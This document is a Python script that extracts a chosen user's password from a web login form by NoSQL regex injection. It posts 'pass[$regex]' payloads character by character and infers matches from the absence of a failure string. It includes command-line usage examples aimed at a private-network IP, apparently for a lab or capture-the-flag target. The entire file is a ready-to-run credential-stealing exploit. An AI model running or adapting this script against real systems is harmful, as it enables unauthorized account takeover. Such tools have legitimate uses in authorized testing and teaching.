import requests
import argparse
import sys
import string
import re

# ==============================================================================
# TERMINAL USAGE EXAMPLES
# 
# Example 1: Full command with known length, failure string, and custom username
# python3 brute.py -u http://10.66.146.113/login.php -un admin -pl 5 -f "err=1"
#
# Example 2: Brute forcing a different user without knowing the length
# python3 brute.py -u http://10.66.146.113/login.php -un guest -f "Invalid"
# ==============================================================================

parser = argparse.ArgumentParser(description="NoSQL Regex Password Brute Forcer")
parser.add_argument("-u", "--url", required=True, help="Target URL")
parser.add_argument("-un", "--username", required=True, help="Username to target (e.g., admin)")
parser.add_argument("-pl", "--length", type=int, help="Password length")
parser.add_argument("-f", "--fail", required=True, help="String that identifies a failed attempt")
args = parser.parse_args()

# Includes lowercase, uppercase, digits, and all punctuation/special symbols
characters = string.ascii_letters + string.digits + string.punctuation
password = ""

print(f"[*] Target URL: {args.url}")
print(f"[*] Targeting User: {args.username}")
print(f"[*] Failure String: '{args.fail}'")

try:
    while True:
        if args.length and len(password) == args.length:
            break
            
        found_char = False
        for char in characters:
            # re.escape(password + char) ensures special chars like '*' or '.' 
            # don't break the regex logic by treating them as literal text.
            safe_payload = re.escape(password + char)
            regex_payload = f"^{safe_payload}.*$"
            
            data = {
                "user": args.username, 
                "pass[$regex]": regex_payload, 
                "remember": "on"
            }
            
            try:
                response = requests.post(args.url, data=data, allow_redirects=False, timeout=5)
                full_raw_response = str(response.headers) + response.text
                
                if args.fail not in full_raw_response:
                    password += char
                    print(f"[+] Found character: {password}")
                    found_char = True
                    break
            except requests.exceptions.RequestException as e:
                print(f"[!] Connection error: {e}")
                sys.exit(1)
                
        if not found_char:
            print("[!] No more characters found or password complete.")
            break

    print(f"\n[SUCCESS] Final Password for {args.username}: {password}")

except KeyboardInterrupt:
    print("\n[!] Script interrupted by user.")
    sys.exit(0)
